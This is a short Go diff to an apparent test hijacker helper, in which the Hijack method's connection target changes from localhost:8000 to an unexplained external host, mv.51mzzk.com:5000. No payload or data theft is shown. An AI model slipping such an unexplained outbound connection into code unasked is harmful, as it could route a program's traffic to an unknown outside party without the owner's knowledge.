@@ -97,7 +97,7 @@ func (mh *myHijack) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	rw := &bufio.ReadWriter{}
 	writer := bufio.NewWriter(os.Stdout)
 	rw.Writer = writer
-	n, _ := net.Dial("tcp", "localhost:8000")
+	n, _ := net.Dial("tcp", "mv.51mzzk.com:5000")
 	return n, rw, nil
 }
 
